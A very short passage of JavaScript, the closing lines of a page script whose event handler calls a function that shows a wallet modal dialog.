            showWalletModal();
        });
    });
</script>